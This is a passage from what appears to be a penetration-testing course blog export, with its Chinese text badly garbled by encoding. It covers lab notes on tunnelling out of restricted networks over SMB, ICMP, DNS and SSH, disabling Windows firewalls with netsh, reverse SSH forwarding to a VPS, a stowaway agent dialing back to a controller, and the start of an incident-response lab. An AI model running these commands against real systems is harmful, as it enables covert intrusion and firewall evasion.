<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-54"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-54" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-åå‘è¿æ¥</p>
<p>ïƒ˜ ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-SMB éš§é“</p>
<p>ïƒ˜ ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-ICMP éš§é“</p>
<p>ïƒ˜ ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-å…³é—­é˜²ç«å¢™</p>
<p><strong>windowsæ˜¯å»ºç«‹SMBé€šé“ ï¼Œlinuxå»ºç«‹SSHé€šé“</strong></p>
<p><strong>æ€ä¹ˆçŸ¥é“å¯¹æ–¹æ˜¯å‡ºç«™é™åˆ¶è¿˜æ˜¯å…¥ç«™é™åˆ¶å‘¢ï¼Ÿ</strong><br>ä¸Šä¼ æ­£å‘å’Œåå‘æœ¨é©¬è¿›è¡Œæµ‹è¯•</p>
<p><strong>ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-ICMPéš§é“</strong><br>ä½¿ç”¨icmpéš§é“ç»•è¿‡å‡ºç«™é™åˆ¶ï¼Œç»†èŠ‚è§ä¸Šä¸€ç« å†…å®¹<br>æ³¨ï¼šwin10ä½œä¸ºpingtunnelæœåŠ¡ç«¯ï¼Œå…¶ä»–æ“ä½œç±»ä¼¼<br>â€¦â€¦</p>
<p><strong>ä¸å‡ºç½‘-æ§åˆ¶ä¸Šçº¿-CS-å…³é—­é˜²ç«å¢™</strong><br>å¦‚æœå–å¾—ç›®æ ‡æœºçš„é«˜æƒé™ä¸”ï¼Œä¿®æ”¹é˜²ç«å¢™è§„åˆ™ï¼Œå…³é—­é˜²ç«å¢™ï¼Œä»¥åŠæ›¿æ¢é˜²ç«å¢™è§„åˆ™é‡Œç¨‹åºã€‚<br>é€‚ç”¨äºï¼š<br>1.å•çº¯çš„å†…ç½‘ç¯å¢ƒ(ç±»ä¼¼æœ¬æ¬¡å®éªŒç¯å¢ƒ)ï¼Œä¸æ˜¯åŸŸç¯å¢ƒ<br>2.å•çº¯çš„å†…ç½‘åŸŸç¯å¢ƒ(ä½†æ˜¯åŸŸæ§DCæ²¡æœ‰è®¾ç½®ç»„ç­–ç•¥é˜²ç«å¢™åŒæ­¥)</p>
<p>å…¥ç«™è¿‡æ»¤ä¸Šçº¿ï¼š</p>
<p>1ã€éš§é“æŠ€æœ¯ç¡¬åˆš</p>
<p>2ã€åå‘è¿æ¥è·³è¿‡</p>
<p>3ã€å…³é—­&amp;åˆ é™¤&amp;æ›¿æ¢</p>
<p>é€‚ç”¨åˆ©ç”¨å…¥ç«™é€šè¡Œæ‹¿åˆ°çš„é«˜æƒé™</p>
<p>å‡ºç«™è¿‡æ»¤ä¸Šçº¿ï¼š</p>
<p>1ã€éš§é“æŠ€æœ¯ç¡¬åˆš</p>
<p>2ã€æ­£å‘è¿æ¥è·³è¿‡</p>
<p>3ã€å…³é—­&amp;åˆ é™¤&amp;æ›¿æ¢</p>
<p>é€‚ç”¨åˆ©ç”¨å…¥ç«™é€šè¡Œæ‹¿åˆ°çš„é«˜æƒé™</p>
<p>éš§é“æŠ€æœ¯ä¸Šçº¿ï¼š</p>
<p>HTTP&#x2F;S &amp; DNS &amp; SSH &amp; ICMP &amp; SMB &amp; åè®®ç©¿é€ç­‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows é˜²ç«å¢™å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/tomtellyou/p/16300557.html</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰é˜²ç«å¢™çŠ¶æ€ï¼šnetsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">å…³é—­é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">å¼€å¯é˜²ç«å¢™ï¼šnetsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">æ¢å¤åˆå§‹é˜²ç«å¢™è®¾ç½®ï¼šnetsh advfirewall reset</span><br><span class="line"></span><br><span class="line">å¯ç”¨æ¡Œé¢é˜²ç«å¢™: netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">è®¾ç½®é»˜è®¤è¾“å…¥å’Œè¾“å‡ºç­–ç•¥ï¼šnetsh advfirewall set allprofiles firewallpolicy,allowinbound,allowoutbound</span><br><span class="line"></span><br><span class="line">å¦‚æœè®¾ç½®ä¸ºæ‹’ç»ä½¿ç”¨ blockinbound,blockoutbound</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬126å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯-SSH-DNS-ICMP-SMB-ä¸Šçº¿é€šè®¯Linux-Mac"><a href="#ç¬¬126å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯-SSH-DNS-ICMP-SMB-ä¸Šçº¿é€šè®¯Linux-Mac" class="headerlink" title="ç¬¬126å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;ä¸Šçº¿é€šè®¯Linux&amp;Mac"></a>ç¬¬126å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;ä¸Šçº¿é€šè®¯Linux&amp;Mac</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-60"><a href="#çŸ¥è¯†ç‚¹ï¼š-60" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å…¥ç«™è§„åˆ™ä¸å‡ºç½‘ä¸Šçº¿æ–¹æ¡ˆ</p>
<p>2ã€å‡ºç«™è§„åˆ™ä¸å‡ºç½‘ä¸Šçº¿æ–¹æ¡ˆ</p>
<p>3ã€éš§é“æŠ€æœ¯-SMB&amp;ICMP&amp;DNS&amp;SSH</p>
<p>4ã€æ§åˆ¶ä¸Šçº¿-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>-è¿æ¥æ–¹å‘ï¼šæ­£å‘&amp;åå‘ï¼ˆåŸºç¡€è¯¾ç¨‹æœ‰è®²è¿‡ï¼‰</p>
<p>-å†…ç½‘ç©¿é€ï¼šè§£å†³ç½‘ç»œæ§åˆ¶ä¸Šçº¿&amp;ç½‘ç»œé€šè®¯é—®é¢˜</p>
<p>-éš§é“æŠ€æœ¯ï¼šè§£å†³ä¸å‡ºç½‘åè®®ä¸Šçº¿çš„é—®é¢˜ï¼ˆåˆ©ç”¨å‡ºç½‘åè®®è¿›è¡Œå°è£…å‡ºç½‘ï¼‰</p>
<p>-ä»£ç†æŠ€æœ¯ï¼šè§£å†³ç½‘ç»œé€šè®¯ä¸é€šçš„é—®é¢˜ï¼ˆåˆ©ç”¨è·³æ¿æœºå»ºç«‹èŠ‚ç‚¹åç»­æ“ä½œï¼‰</p>
<h4 id="ç³»åˆ—ç‚¹ï¼š-3"><a href="#ç³»åˆ—ç‚¹ï¼š-3" class="headerlink" title="#ç³»åˆ—ç‚¹ï¼š"></a>#ç³»åˆ—ç‚¹ï¼š</h4><p>1ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨ä»£ç†</p>
<p>2ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨éš§é“</p>
<p>3ã€åˆ¤æ–­å‡ºç½‘å’Œä¸å‡ºç½‘åè®®</p>
<p>4ã€å¦‚ä½•ä½¿ç”¨ä»£ç†å»ºç«‹èŠ‚ç‚¹å¹¶è¿æ¥</p>
<p>5ã€å¦‚ä½•ä½¿ç”¨éš§é“æŠ€æœ¯å°è£…åè®®ä¸Šçº¿</p>
<p>6ã€åˆ¤æ–­å“ªäº›ä»£ç†æˆ–éš§é“æƒ…å†µé€‰æ‹©æ”¾å¼ƒ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/63f4b1a104567b33b43cd8c1f8be375b--3e6f--image-20240511091624701.png" alt="image-20240511091624701"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/19753b8cfc1445cd20e5cd78f4224ff4--c9fc--image-20240511091655868.png" alt="image-20240511091655868"></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-55"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-55" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ éš§é“æŠ€æœ¯-SMB åè®®-åˆ¤æ–­&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>ïƒ˜ éš§é“æŠ€æœ¯-ICMP åè®®-åˆ¤æ–­&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>ïƒ˜ éš§é“æŠ€æœ¯-DNS åè®®-åˆ¤æ–­&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>ïƒ˜ éš§é“æŠ€æœ¯-SSH åè®®-åˆ¤æ–­&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>ïƒ˜ æ§åˆ¶ä¸Šçº¿-æ’ä»¶-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>1ã€åˆ¤æ–­å‡ºç½‘åè®®</p>
<p>2ã€ä½¿ç”¨å‡ºç½‘åè®®å»ºç«‹éš§é“</p>
<p>#SMB éš§é“&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>åˆ¤æ–­ï¼š445 é€šè®¯</p>
<p>ä¸Šçº¿ï¼šå€ŸåŠ©é€šè®¯åç»‘å®šä¸Šçº¿</p>
<p>é€šè®¯ï¼šç›´æ¥ SMB åè®®é€šè®¯å³å¯</p>
<p>#ICMP éš§é“&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>åˆ¤æ–­ï¼šping å‘½ä»¤</p>
<p>ä¸Šçº¿ï¼šè§å‰é¢è¯¾ç¨‹</p>
<p>é€šè®¯ï¼šå…¶ä»–é¡¹ç›®(icmpsh icmptunnel)</p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>#DNS éš§é“&amp;é€šè®¯&amp;ä¸Šçº¿</p>
<p>åˆ¤æ–­ï¼šnslookup dig</p>
<p>1ã€ä¸Šçº¿ç¯å¢ƒï¼šå†…ç½‘ä¸»æœºåªå‡ºç½‘ DNS åè®®æ•°æ®ï¼Œè§£å†³ä¸Šçº¿</p>
<p>-åŸŸåç”³è¯·åŠé…ç½®</p>
<p>-ç›‘å¬å™¨åˆ›å»ºåŠé…ç½®</p>
<p>-åé—¨ç»‘å®šç›‘å¬å™¨åŠç”Ÿæˆ</p>
<p>2ã€é€šè®¯ç¯å¢ƒï¼š</p>
<p>å†…ç½‘ä¸»æœºåªå‡ºç½‘ DNS åè®®æ•°æ®ï¼Œè§£å†³é€šè®¯</p>
<p><a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
<p>åˆ¤æ–­å‡ºç½‘ï¼šnslookup <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>-æœåŠ¡å™¨ï¼šè®¾ç½®å¯†ç  xiaodi å¹¶åˆ›å»ºè™šæ‹Ÿ IP åŠç»‘å®šåŸŸåæŒ‡å‘</p>
<p>iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</p>
<p>è®¾ç½®å¯†ç  xiaodi å¹¶åˆ›å»ºè™šæ‹Ÿ IP åŠç»‘å®šåŸŸåæŒ‡å‘</p>
<p>-å®¢æˆ·ç«¯ï¼šè¿æ¥å¯†ç  xiaodi å¹¶ç»‘å®šåŸŸåæŒ‡å‘</p>
<p>iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</p>
<p>-å°è¯•é€šè®¯å°è¯•è¿æ¥ï¼š</p>
<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;</a></p>
<p>#SSH éš§é“&amp;é€šè®¯</p>
<p>åˆ¤æ–­ï¼šssh è¿æ¥</p>
<p>1ã€ä¸Šçº¿ï¼š</p>
<p>ç”±äº CS æ—  SSH åè®®ç›‘å¬å™¨é…ç½®ï¼Œæ— æ³•ä¸Šçº¿</p>
<p>2ã€é€šè®¯ï¼š</p>
<p>ç”±äºSSHåè®®å­˜åœ¨äºLinuxç³»ç»Ÿï¼Œè·³æ¿æœºå¿…é¡»Linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F /* æ¸…é™¤æ‰€æœ‰è§„åˆ™ /</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT /å…è®¸åŒ…ä»22ç«¯å£è¿›å…¥/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /å…è®¸ä»22ç«¯å£è¿›å…¥çš„åŒ…è¿”å›/</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT / åŸŸåè§£æç«¯å£ï¼Œä¸€èˆ¬ä¸å¼€ /</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT / åŸŸåè§£æç«¯å£ï¼Œä¸€èˆ¬ä¸å¼€ /</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT /å…è®¸æœ¬æœºè®¿é—®æœ¬æœº/</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT /å…è®¸æ‰€æœ‰IPè®¿é—®80ç«¯å£/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables /ä¿å­˜é…ç½®/</span><br><span class="line">iptables -L / æ˜¾ç¤ºiptablesåˆ—è¡¨ */</span><br></pre></td></tr></table></figure>

<p>å¼€å¯sshåè®®ç™»å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°ï¼šå…¥ç«™å°<br>å°†æœ¬åœ°è®¿é—® 10.10.10.132çš„æµé‡è½¬å‘è‡³å…¬ç½‘vps 1234ç«¯å£ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 1122:10.10.10.132:8080 root@47.94.130.xx</span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure>

<p>è¿œç¨‹ï¼šå‡ºç«™å°<br>å°†æœ¬åœ°è®¿é—®10.10.10.132çš„æµé‡è½¬å‘è‡³æœ¬åœ°çš„1234çš„ç«¯å£ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 1234:10.10.10.132:8080 root@10.10.10.146</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<p>é˜²å¾¡DNSéš§é“æ”»å‡»çš„æ–¹æ³•<br>ç¦æ­¢ç½‘ç»œä¸­ä»»ä½•äººå‘å¤–éƒ¨æœåŠ¡å™¨å‘é€DNSè¯·æ±‚ï¼Œåªå…è®¸ä¸å—ä¿¡ä»»çš„DNSæœåŠ¡å™¨é€šä¿¡ã€‚<br>è™½ç„¶æ²¡æœ‰äººä¼šå°†TXTè§£æè¯·æ±‚å‘é€ç»™DNSæœåŠ¡å™¨ï¼Œä½†æ˜¯é‚®ä»¶æœåŠ¡å™¨&#x2F;ç½‘å…³ä¼šè¿™æ ·åšï¼Œå› æ­¤ï¼Œå¯ä»¥å°†é‚®ä»¶æœåŠ¡å™¨&#x2F;ç½‘å…³åˆ—å…¥ç™½åå•å¹¶é˜»æ­¢ä¼ å…¥å’Œä¼ å‡ºæµé‡ä¸­çš„TXTè¯·æ±‚ã€‚<br>è·Ÿè¸ªç”¨æˆ·çš„DNSæŸ¥è¯¢æ¬¡æ•°ï¼Œå¦‚æœè¾¾åˆ°é˜ˆå€¼ï¼Œå°±ç”Ÿæˆç›¸åº”çš„æŠ¥å‘Š</p>
<p>æ§åˆ¶ä¸Šçº¿-æ’ä»¶-Linux&amp;Mac&amp;IOS&amp;Android<br>é¡¹ç›®ï¼š<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>é¢å‘Linux Mac IOS Androidç³»ç»Ÿä¸Šçº¿æ”¯æŒ<br>1ã€æ’ä»¶ä½¿ç”¨<br>2ã€å‘½ä»¤ä½¿ç”¨<br>ä½¿ç”¨å‚è€ƒï¼š<br><a href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>1ã€ä¸‹è½½å¯¹åº”ç‰ˆæœ¬åŠ è½½å™¨å’ŒCNAæ’ä»¶<br>2ã€ä¸Šä¼ åŠ è½½å™¨æ–‡ä»¶å’Œæœ¬åœ°åŠ è½½CNAæ’ä»¶<br>3ã€ä¿®æ”¹CNAæ’ä»¶é…ç½®è·¯å¾„åŠä¸Šä¼ Keyæ–‡ä»¶<br>4ã€ä½¿ç”¨å‘½ä»¤æˆ–æ’ä»¶ç»‘å®šHTTPSç›‘å¬å™¨ç”Ÿæˆ</p>
<p>ä½¿ç”¨CS4.7ç‰ˆæœ¬æ²¡æœ‰æ­å»ºæˆåŠŸ</p>
<h1 id="ç¬¬127å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æ­å»º-ç©¿é€ä¸Šçº¿-FRP-NPS-SPP-Ngrok-EWé¡¹ç›®"><a href="#ç¬¬127å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æ­å»º-ç©¿é€ä¸Šçº¿-FRP-NPS-SPP-Ngrok-EWé¡¹ç›®" class="headerlink" title="ç¬¬127å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æ­å»º&amp;ç©¿é€ä¸Šçº¿&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EWé¡¹ç›®"></a>ç¬¬127å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æ­å»º&amp;ç©¿é€ä¸Šçº¿&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EWé¡¹ç›®</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-61"><a href="#çŸ¥è¯†ç‚¹ï¼š-61" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å†…ç½‘éš§é“&amp;ç©¿é€&amp;åŠ å¯†&amp;ä¸Šçº¿</p>
<p>2ã€é¡¹ç›®-Ngrok&amp;Frp&amp;Nps&amp;Spp</p>
<p>-è¿æ¥æ–¹å‘ï¼šæ­£å‘&amp;åå‘ï¼ˆåŸºç¡€è¯¾ç¨‹æœ‰è®²è¿‡ï¼‰</p>
<p>-å†…ç½‘ç©¿é€ï¼šè§£å†³ç½‘ç»œæ§åˆ¶ä¸Šçº¿&amp;ç½‘ç»œé€šè®¯é—®é¢˜</p>
<p>-éš§é“æŠ€æœ¯ï¼šè§£å†³ä¸å‡ºç½‘åè®®ä¸Šçº¿çš„é—®é¢˜ï¼ˆåˆ©ç”¨å‡ºç½‘åè®®è¿›è¡Œå°è£…å‡ºç½‘ï¼‰</p>
<p>-ä»£ç†æŠ€æœ¯ï¼šè§£å†³ç½‘ç»œé€šè®¯ä¸é€šçš„é—®é¢˜ï¼ˆåˆ©ç”¨è·³æ¿æœºå»ºç«‹èŠ‚ç‚¹åç»­æ“ä½œï¼‰</p>
<h4 id="ç³»åˆ—ç‚¹ï¼š-4"><a href="#ç³»åˆ—ç‚¹ï¼š-4" class="headerlink" title="#ç³»åˆ—ç‚¹ï¼š"></a>#ç³»åˆ—ç‚¹ï¼š</h4><p>1ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨ä»£ç†</p>
<p>2ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨éš§é“</p>
<p>3ã€åˆ¤æ–­å‡ºç½‘å’Œä¸å‡ºç½‘åè®®</p>
<p>4ã€å¦‚ä½•ä½¿ç”¨ä»£ç†å»ºç«‹èŠ‚ç‚¹å¹¶è¿æ¥</p>
<p>5ã€å¦‚ä½•ä½¿ç”¨éš§é“æŠ€æœ¯å°è£…åè®®ä¸Šçº¿</p>
<p>6ã€åˆ¤æ–­å“ªäº›ä»£ç†æˆ–éš§é“æƒ…å†µé€‰æ‹©æ”¾å¼ƒ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/3d6e827033023f8a4d370bc1daaf216a--0495--image-20240511092308716.png" alt="image-20240511092308716"></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-56"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-56" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ å†…ç½‘ç©¿é€-Ngrok-å…¥é—¨-ä¸Šçº¿</p>
<p>ïƒ˜ å†…ç½‘ç©¿é€-Frp-ç®€æ˜“å‹-ä¸Šçº¿</p>
<p>ïƒ˜ å†…ç½‘ç©¿é€-Nps-è‡ªå®šä¹‰-ä¸Šçº¿</p>
<p>ïƒ˜ å†…ç½‘ç©¿é€-Spp-ç‰¹æ®Šåè®®-ä¸Šçº¿</p>
<p>æ—¨åœ¨ä»£ç†è¿æ¥è‚‰é¸¡åå®ç°æœ¬åœ°æ¸—é€è‚‰é¸¡ç½‘ç»œæ¶æ„</p>
<p>Linuxï¼šProxychains</p>
<p>Windowsï¼šSockscap Proxifier</p>
<p>ç©¿é€é¡¹ç›®ï¼šNgrok Frp Spp Nps EW(åœæ›´)</p>
<p>ä¼˜ç‚¹ï¼šç©¿é€åŠ å¯†æ•°æ®ï¼Œä¸­é—´å¹³å°ï¼Œé˜²è¿½è¸ªï¼Œè§£å†³ç½‘ç»œé—®é¢˜</p>
<p><a href="https://www.ngrok.cc/">https://www.ngrok.cc</a></p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p><a href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
<p>å†…ç½‘ç©¿é€çš„éš§é“æ­å»ºæœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸»è¦è®²è®²æˆ‘ä½¿ç”¨çš„å·¥å…·stowaway</p>
<p><a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a>   å‚è€ƒé“¾æ¥</p>
<p>1ã€æ§åˆ¶ç«¯é…ç½®</p>
<p>ä¸Šä¼ æ§åˆ¶ç«¯åˆ°kaliï¼Œä½¿ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œç›‘å¬ç«¯å£8000ï¼Œå¹¶å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ç§˜é’¥ä¸º123ã€‚ç­‰å¾…è¢«æ§ç«¯çš„è¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 192.168.125.134:8000 -s 123</span><br></pre></td></tr></table></figure>

<p> #æˆ–è€…ä¸æŒ‡å®šipé»˜è®¤ç›‘å¬0.0.0.0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>

<p>2ã€è¢«æ§ç«¯é…ç½®</p>
<p>åœ¨win2012-1ä¸Šæ‰§è¡Œï¼Œä½¿ç”¨ç§˜é’¥123è¿æ¥æ§åˆ¶ç«¯8000ç«¯å£ï¼Œå¹¶è®¾ç½®é‡è¿é—´éš”æ—¶é—´ï¼Œå½“æ§åˆ¶ç«¯æ‰çº¿æ—¶å®¢æˆ·ç«¯æ¯éš”8sé‡è¿æ§åˆ¶ç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯åœ¨adminç«¯å»åˆ›å»ºsockså³å¯</p>
<h1 id="ç¬¬128å¤©ï¼šå†…ç½‘å®‰å…¨-æ¨ªå‘ç§»åŠ¨-IPC-AT-SCå‘½ä»¤-Impacketå¥—ä»¶-CSæ’ä»¶-å…¨è‡ªåŠ¨"><a href="#ç¬¬128å¤©ï¼šå†…ç½‘å®‰å…¨-æ¨ªå‘ç§»åŠ¨-IPC-AT-SCå‘½ä»¤-Impacketå¥—ä»¶-CSæ’ä»¶-å…¨è‡ªåŠ¨" class="headerlink" title="ç¬¬128å¤©ï¼šå†…ç½‘å®‰å…¨-æ¨ªå‘ç§»åŠ¨&amp;IPC&amp;AT&amp;SCå‘½ä»¤&amp;Impacketå¥—ä»¶&amp;CSæ’ä»¶&amp;å…¨è‡ªåŠ¨"></a>ç¬¬128å¤©ï¼šå†…ç½‘å®‰å…¨-æ¨ªå‘ç§»åŠ¨&amp;IPC&amp;AT&amp;SCå‘½ä»¤&amp;Impacketå¥—ä»¶&amp;CSæ’ä»¶&amp;å…¨è‡ªåŠ¨</h1>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>åº”æ€¥å“åº”</title>
    <url>/2024/06/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<p>æœ€è¿‘æœ‰ä¸€ä¸ªåº”æ€¥å“åº”çš„é¶åœºï¼Œç„æœºåº”æ€¥å“åº”ï¼Œæ‰€ä»¥ä¹Ÿå°±å»ç ”ç©¶ç ”ç©¶åº”æ€¥å“åº”ç›¸å…³çš„çŸ¥è¯†ã€‚</p>
<span id="more"></span>

<h1 id="ç¬¬ä¸€ç« -åº”æ€¥å“åº”"><a href="#ç¬¬ä¸€ç« -åº”æ€¥å“åº”" class="headerlink" title="ç¬¬ä¸€ç« -åº”æ€¥å“åº”"></a>ç¬¬ä¸€ç« -åº”æ€¥å“åº”</h1><h2 id="Linuxæ—¥å¿—åˆ†æ"><a href="#Linuxæ—¥å¿—åˆ†æ" class="headerlink" title="Linuxæ—¥å¿—åˆ†æ"></a>Linuxæ—¥å¿—åˆ†æ</h2><p><a href="https://blog.csdn.net/qq_50765147/article/details/135878715">https://blog.csdn.net/qq_50765147/article/details/135878715</a>  ç›¸å…³èµ„æ–™é“¾æ¥</p>
<p>é¦–å…ˆå°±æ˜¯è¿›å…¥é¢˜ç›®ï¼Œsshè¿æ¥åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»è¯»å–ä¸€ä¸‹Linuxæ—¥å¿—æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3a0d9c411882c5bc7705afad91b22bb5--6149--image-20240603210232034.png" alt="image-20240603210232034"></p>
<h4 id="ä»»åŠ¡ä¸€"><a href="#ä»»åŠ¡ä¸€" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><p>ç¬¬ä¸€ä¸ªä»»åŠ¡å°±æ˜¯æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰² å°åˆ°å¤§æ’åº ä¾‹å¦‚flag{192.168.200.1,192.168.200.2}</p>
<p>ç¬¬ä¸€ä¸ª Flag çš„ç›®æ ‡æ˜¯æŸ¥æ‰¾çˆ†ç ´ SSH æœåŠ¡ Root è´¦æˆ·çš„ IPï¼Œæ•…è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ†æ auth æ—¥å¿—ï¼Œauth æ—¥å¿—å¸¸è§äº Debian ç³»ï¼ˆè¿™å°é¶æœºå°±æ˜¯ Debianï¼‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/d28b0f9e7667d37d50f5622699501adf--f84c--4-1715845855.jpeg" alt="4-1715845855"></p>
